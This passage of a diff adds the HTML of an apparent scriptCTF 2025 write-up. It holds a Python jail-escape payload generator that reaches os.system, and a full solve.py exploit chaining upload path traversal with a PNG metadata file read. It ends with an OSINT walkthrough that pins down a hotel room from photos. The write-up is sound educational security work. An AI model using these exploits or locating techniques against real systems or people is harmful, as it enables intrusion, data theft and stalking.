+</span></span></span><span class="line"><span class="cl"><span class="s2">    Build a string literal via &#34;</span><span class="si">%c</span><span class="s2">&#34;*k % (codepoints...),
+</span></span></span><span class="line"><span class="cl"><span class="s2">    where each codepoint is built via n_expr.
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Only </span><span class="si">% a</span><span class="s2">s BinOp; no forbidden letters in source.
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parts</span> <span class="o">=</span> <span class="p">[</span><span class="n">n_expr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">ch</span><span class="p">))</span> <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">s</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;&#34;&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="s2">&#34;</span><span class="si">%c</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="nb">len</span><span class="p">(</span><span class="n">parts</span><span class="p">))</span> <span class="o">+</span> <span class="s1">&#39;&#34;%(&#39;</span> <span class="o">+</span> <span class="s2">&#34;,&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">parts</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;)&#34;</span>
+</span></span></code></pre></div><h3 id="exploit">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h3>
+<p>The exploit consists of two parts:</p>
+<ol>
+<li>Accessing ModuleSpec (Probe)</li>
+<li>RCE (Exec)</li>
+</ol>
+<h4 id="probing">Probing<a hidden class="anchor" aria-hidden="true" href="#probing">#</a></h4>
+<p>All classes in Python are subclasses of <code>object</code> and every class has an attribute called <code>__subclasses__</code>. So we can get to <code>ModuleSpec</code> from there. The question is how to get to <code>object</code>.</p>
+<p>Here <code>__mro__</code> comes into play. Every class in Python has a <code>__mro__</code> attribute, the <em>method resolution order</em>. It is a tuple of classes Python will search when looking up attributes. For example, using <code>c</code> aka <code>getattr</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="nb">getattr</span><span class="o">.</span><span class="vm">__class__</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="k">class</span> <span class="err">&#39;</span><span class="nc">builtin_function_or_method</span><span class="s1">&#39;&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="nb">getattr</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="o">&lt;</span><span class="k">class</span> <span class="err">&#39;</span><span class="nc">builtin_function_or_method</span><span class="s1">&#39;&gt;, &lt;class &#39;</span><span class="nb">object</span><span class="s1">&#39;&gt;)</span>
+</span></span></code></pre></div><p>So <code>getattr.__class__.__mro__[-1]</code> gives us <code>object</code>, and then <code>object.__subclasses__()</code> gives us the full list of subclasses, including <code>ModuleSpec</code>.</p>
+<p>There is still an obstacle however:</p>
+<pre tabindex="0"><code>&gt;&gt;&gt; len(getattr.__class__.__mro__[-1].__subclasses__())
+286
+</code></pre><p>How do we know where <code>ModuleSpec</code> lies? We don&rsquo;t have access to the <code>print</code> function so we can&rsquo;t just print each one of them. When testing locally we had success with the following approach:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">probe_payload</span><span class="p">(</span><span class="n">i</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Raises KeyError with the name of object.__subclasses__()[i],
+</span></span></span><span class="line"><span class="cl"><span class="s2">    leaking the class name via traceback.
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">NAME</span> <span class="o">=</span> <span class="n">str_expr</span><span class="p">(</span><span class="s2">&#34;__name__&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">subs</span> <span class="o">=</span> <span class="n">subclasses_list_expr</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">idx</span>  <span class="o">=</span> <span class="n">n_expr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;(</span><span class="si">{</span><span class="n">define_zero</span><span class="p">()</span><span class="si">}</span><span class="s2">,</span><span class="se">{{}}</span><span class="s2">[c(</span><span class="si">{</span><span class="n">subs</span><span class="si">}</span><span class="s2">[</span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="s2">],</span><span class="si">{</span><span class="n">NAME</span><span class="si">}</span><span class="s2">)])&#34;</span>
+</span></span></code></pre></div><p>The idea is to get <code>subclasses()[i]</code> and to access an empty dict using that as a key. That will trow a key error and will leak the name of the class. That testing locally, using <code>pwntools</code>&rsquo;s process utility.
+However when trying remotely we didn&rsquo;t see anything because <code>stderr</code> was missing.
+We remembered about the dockerfile, built the image and tested the <code>probe</code> on that container, where we could see the stderr logs. The logic was that the image was the same so the index of <code>ModuleSpec</code> would not change.</p>
+<p>We probed the indices between <code>0</code> and <code>200</code> and found <code>ModuleSpec</code> around index <code>100</code>.</p>
+<h4 id="rce">RCE<a hidden class="anchor" aria-hidden="true" href="#rce">#</a></h4>
+<p>Now that we have access to <code>ModuleSpec</code> we can access the <code>__globals__</code> and <code>sys</code> and execute arbitrary shell commands:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exec_payload</span><span class="p">(</span><span class="n">idx</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">cmd</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Execute via: ModuleSpec.__init__.__globals__[&#39;sys&#39;].modules[&#39;posix&#39;].system(cmd)
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">subs</span> <span class="o">=</span> <span class="n">subclasses_list_expr</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">INIT</span> <span class="o">=</span> <span class="n">str_expr</span><span class="p">(</span><span class="s2">&#34;__init__&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">GLOB</span> <span class="o">=</span> <span class="n">str_expr</span><span class="p">(</span><span class="s2">&#34;__globals__&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">SYS</span>  <span class="o">=</span> <span class="n">str_expr</span><span class="p">(</span><span class="s2">&#34;sys&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">MODS</span> <span class="o">=</span> <span class="n">str_expr</span><span class="p">(</span><span class="s2">&#34;modules&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">POSX</span> <span class="o">=</span> <span class="n">str_expr</span><span class="p">(</span><span class="s2">&#34;posix&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">SYSF</span> <span class="o">=</span> <span class="n">str_expr</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">CMD</span>  <span class="o">=</span> <span class="n">str_expr</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">IDX</span>  <span class="o">=</span> <span class="n">n_expr</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">sys</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;(c(c(</span><span class="si">{</span><span class="n">subs</span><span class="si">}</span><span class="s2">[</span><span class="si">{</span><span class="n">IDX</span><span class="si">}</span><span class="s2">],</span><span class="si">{</span><span class="n">INIT</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">GLOB</span><span class="si">}</span><span class="s2">)[</span><span class="si">{</span><span class="n">SYS</span><span class="si">}</span><span class="s2">])&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">posix</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;(c(</span><span class="si">{</span><span class="n">sys</span><span class="si">}</span><span class="s2">,</span><span class="si">{</span><span class="n">MODS</span><span class="si">}</span><span class="s2">)[</span><span class="si">{</span><span class="n">POSX</span><span class="si">}</span><span class="s2">])&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="sa">f</span><span class="s2">&#34;(</span><span class="si">{</span><span class="n">define_zero</span><span class="p">()</span><span class="si">}</span><span class="s2">,c(</span><span class="si">{</span><span class="n">posix</span><span class="si">}</span><span class="s2">,</span><span class="si">{</span><span class="n">SYSF</span><span class="si">}</span><span class="s2">)(</span><span class="si">{</span><span class="n">CMD</span><span class="si">}</span><span class="s2">))&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span></code></pre></div><p>After some exploring with <code>ls</code> we found a file called <code>flag.txt</code> and we leaked it using a simple <code>cat</code>.</p>
+<h2 id="wizard-gallery-">Wizard Gallery 🌐<a hidden class="anchor" aria-hidden="true" href="#wizard-gallery-">#</a></h2>
+<p>When we launch the service we notice an image upload that trusts the <strong>client-supplied filename</strong> and a separate route that serves a <strong>small &ldquo;logo&rdquo; thumbnail</strong>. That’s enough of a foothold to try two classic tricks: path traversal on the upload, and metadata shenanigans on the thumbnailer.</p>
+<h3 id="exploit-path">Exploit path<a hidden class="anchor" aria-hidden="true" href="#exploit-path">#</a></h3>
+<p>So, in order to explain the exploit we need to analyze the source code, there we found a few things that have been useful while pwning the service.</p>
+<ul>
+<li>The uploader accepts arbitrary filenames; <code>../logo.png</code> lands <strong>outside</strong> the intended folder, letting us overwrite the site’s main <code>logo.png</code>.</li>
+<li>The thumbnailer that serves <code>logo-sm.png</code> <strong>reads PNG metadata</strong> (a <code>tEXt</code> key named <code>profile</code>) and appears to <strong>dereference it as a local path</strong> while generating the small logo.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/uploads/&lt;filename&gt;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">uploaded_file</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">   <span class="c1"># Make sure to handle the case where the file is logo-sm.png (not part of the vault)</span>
+</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="n">filename</span> <span class="o">==</span> <span class="s1">&#39;logo-sm.png&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="s2">&#34;File not found&#34;</span><span class="p">,</span> <span class="mi">404</span>
+</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="n">send_from_directory</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;UPLOAD_FOLDER&#39;</span><span class="p">],</span> <span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Serve all files from public to /</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&lt;path:filename&gt;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">serve_files</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">   <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">send_from_directory</span><span class="p">(</span><span class="n">PUBLIC_DIR</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="s2">&#34;File not found&#34;</span><span class="p">,</span> <span class="mi">404</span>
+</span></span></code></pre></div><p>Once we fully understood where the vulnerabilities relied we had only to actually write a python script that had to:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/logo-sm.png&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">logo_small</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">   <span class="c1"># A smaller images looks better on mobile so I just resize it and serve that</span>
+</span></span><span class="line"><span class="cl">   <span class="n">logo_sm_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;UPLOAD_FOLDER&#39;</span><span class="p">],</span> <span class="s1">&#39;logo-sm.png&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">logo_sm_path</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">      <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;magick/bin/convert logo.png -resize 10% &#34;</span> <span class="o">+</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;UPLOAD_FOLDER&#39;</span><span class="p">],</span> <span class="s1">&#39;logo-sm.png&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="n">send_from_directory</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;UPLOAD_FOLDER&#39;</span><span class="p">],</span> <span class="s1">&#39;logo-sm.png&#39;</span><span class="p">)</span>
+</span></span></code></pre></div><ol>
+<li><strong>Craft a PNG</strong> with a <code>tEXt</code> chunk: <code>profile=/home/chall/flag.txt</code>.
+(Any tiny valid PNG works; the key is the <code>profile</code> text chunk.)</li>
+<li><strong>Overwrite the real logo</strong> by uploading that PNG but naming it <code>../logo.png</code> in the form field.
+(This abuses path traversal to replace the file the site later thumbnails.)</li>
+<li><strong>Trigger processing</strong> by requesting the small logo (e.g., <code>/logo-sm.png</code>).
+The image pipeline reads the <code>profile</code> value and <strong>embeds the file’s bytes</strong> into the output image stream.</li>
+<li><strong>Exfiltrate</strong> by downloading the returned PNG and scraping long hex runs from the byte stream; concatenate, hex-decode, and you recover the secret.</li>
+<li><strong>Flag</strong> is exactly the contents of <code>flag.txt</code> produced by step 4 (printed by the helper script).</li>
+</ol>
+<h3 id="one-liner-test">One-liner test<a hidden class="anchor" aria-hidden="true" href="#one-liner-test">#</a></h3>
+<p>It&rsquo;s also possible to write</p>
+<ul>
+<li><strong>Upload (traversal):</strong> <code>filename=../logo.png</code> with your crafted PNG as the body.</li>
+<li><strong>Fetch:</strong> <code>GET /logo-sm.png</code> -&gt; save response -&gt; regex out <code>[a-f0-9]{5,}</code>, join, <code>bytes.fromhex(...).decode()</code>.</li>
+</ul>
+<h3 id="automation">Automation<a hidden class="anchor" aria-hidden="true" href="#automation">#</a></h3>
+<p>Running <code>python3 solve.py &lt;HOST&gt; &lt;PORT&gt;</code> performs all steps: builds the malicious PNG with the <code>profile</code> chunk, overwrites <code>logo.png</code>, fetches <code>logo-sm.png</code>, strips hex sequences from the response, decodes, and <strong>prints the flag</strong>. (Artifacts: <code>final_exploit.png</code> and <code>final_output.png</code> for inspection.)</p>
+<p><strong>Final submission:</strong> the exact string output from the decode step (contents of <code>flag.txt</code>).</p>
+<p><strong>P.S.</strong>: To find the actual path of the flag we made the server crash in order to get the Flask Debug page (<code>debug=True</code>).</p>
+<h3 id="exploit-1">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-1">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span><span class="p">,</span> <span class="n">PngImagePlugin</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">MALICIOUS_PNG_PATH</span> <span class="o">=</span> <span class="s2">&#34;final_exploit.png&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">OUTPUT_PNG_PATH</span> <span class="o">=</span> <span class="s2">&#34;final_output.png&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create_png</span><span class="p">(</span><span class="n">file_to_read</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s2">&#34;RGB&#34;</span><span class="p">,</span> <span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">10</span><span class="p">),</span> <span class="n">color</span><span class="o">=</span><span class="s2">&#34;black&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">info</span> <span class="o">=</span> <span class="n">PngImagePlugin</span><span class="o">.</span><span class="n">PngInfo</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">info</span><span class="o">.</span><span class="n">add_text</span><span class="p">(</span><span class="s2">&#34;profile&#34;</span><span class="p">,</span> <span class="n">file_to_read</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">img</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="n">MALICIOUS_PNG_PATH</span><span class="p">,</span> <span class="s2">&#34;PNG&#34;</span><span class="p">,</span> <span class="n">pnginfo</span><span class="o">=</span><span class="n">info</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">reset_server_cache</span><span class="p">(</span><span class="n">upload_url</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;reset_file&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&#34;reset&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;file&#34;</span><span class="p">:</span> <span class="p">(</span><span class="s2">&#34;reset&#34;</span><span class="p">,</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;reset_file&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">),</span> <span class="s2">&#34;application/octet-stream&#34;</span><span class="p">)}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">upload_url</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s2">&#34;reset_file&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">base_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;http://</span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span> <span class="c1"># python solve.py host port</span>
+</span></span><span class="line"><span class="cl">    <span class="n">upload_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/upload&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">logo_sm_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/logo-sm.png&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">reset_server_cache</span><span class="p">(</span><span class="n">upload_url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">create_png</span><span class="p">(</span><span class="s2">&#34;/home/chall/flag.txt&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;file&#34;</span><span class="p">:</span> <span class="p">(</span><span class="s2">&#34;../logo.png&#34;</span><span class="p">,</span> <span class="nb">open</span><span class="p">(</span><span class="n">MALICIOUS_PNG_PATH</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">),</span> <span class="s2">&#34;image/png&#34;</span><span class="p">)}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">upload_url</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">15</span><span class="p">)</span><span class="o">.</span><span class="n">raise_for_status</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">logo_sm_url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">logo_sm_url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">15</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span><span class="o">.</span><span class="n">raise_for_status</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">OUTPUT_PNG_PATH</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">flag_dec</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">flag</span> <span class="ow">in</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;[a-f0-9]+&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">4</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flag_dec</span> <span class="o">+=</span> <span class="n">flag</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">flag_dec</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></div><h2 id="insider-4-">Insider 4 🔎<a hidden class="anchor" aria-hidden="true" href="#insider-4-">#</a></h2>
+<h3 id="introduction">Introduction<a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h3>
+<p>When we open the <code>.insider-4</code> <a href="https://github.com/scriptCTF/scriptCTF26/tree/main/OSINT/.insider-4/attachments">folder</a>, we see <code>fireworks.jpg</code>, <code>room.jpg</code>, and a <code>.secret</code> file note mentioning that the photographer adds comments to their pictures. That points us straight to hidden
+metadata.</p>
+<h3 id="analysis">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis">#</a></h3>
+<p>Using <strong>exiftool</strong> on the images, we find in <code>fireworks.jpg</code> a comment about the <em>Wendell family</em> organizing fireworks. <a href="https://wendellfamilyfireworks.com/places-to-eat-stay-watch/">A quick search</a> shows the Wendell family holds annual fireworks in Rockport, Texas. That narrows
+the vacation location down to the Rockport area.</p>
+<p>Next, we check the second image, <code>room.jpg</code>. Itʼs clearly a photo taken from a hotel room balcony with a
+direct seaside view. Knowing the fireworks happen at Rockport, we pull up Google Maps, type in &ldquo;hotels&rdquo;
+along the waterfront, and start matching the balconies and overall structure. After some back and forth with Street View, the match is obvious: <strong>Days Inn by Wyndham Rockport, 901 Hwy 35 N, Rockport, TX 78382</strong> (<a href="https://maps.app.goo.gl/sSV1KWFeVUWauTWZ9"><code>https://maps.app.goo.gl/sSV1KWFeVUWauTWZ9</code></a>).</p>
+<p>Now weʼre left with figuring out the actual room number. Since the challenge hinted we wouldnʼt need to
+brute force endlessly, we thought of checking <strong>Google Maps reviews and guest photos</strong>, as people love
+posting pictures of their rooms. Sure enough, scrolling through the photos, we stumble across an image
+containing room numbers <strong>115</strong> and <strong>116</strong> right next to each other. We observed that the room numbers
+descend as we go toward the part of the building matching our balcony view in <code>room.jpg</code>. That means our
+target room should be a bit lower than 115.</p>
+<p>We test a small range: 114, 113, 112, 111, etc. And room <strong>111</strong> hits.</p>
+<p>The flag requires address plus room number, formatted like the example. The hotelʼs street address is <code>901 Hwy 35 N</code>, so the final submission looks like this:</p>
+<pre tabindex="0"><code>scriptCTF{901_Hwy_35_N_111}
+</code></pre>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://albovo.github.io/en/tags/scriptctf/">Scriptctf</a></li>
+      <li><a href="https://albovo.github.io/en/tags/ctf/">Ctf</a></li>
+      <li><a href="https://albovo.github.io/en/tags/web/">Web</a></li>
+      <li><a href="https://albovo.github.io/en/tags/programming/">Programming</a></li>
+      <li><a href="https://albovo.github.io/en/tags/pyjail/">Pyjail</a></li>
+      <li><a href="https://albovo.github.io/en/tags/osint/">Osint</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="https://albovo.github.io/en/ctf/enowars2025/">
+    <span class="title">Next »</span>
+    <br>
+    <span>ENOWARS 9</span>
+  </a>
+</nav>
+
+
+<ul class="share-buttons">
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share scriptCTF 2025 on x"
+            href="https://x.com/intent/tweet/?text=scriptCTF%202025&amp;url=https%3a%2f%2falbovo.github.io%2fen%2fctf%2fscriptctf2025%2f&amp;hashtags=scriptctf%2cctf%2cweb%2cprogramming%2cpyjail%2cosint">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
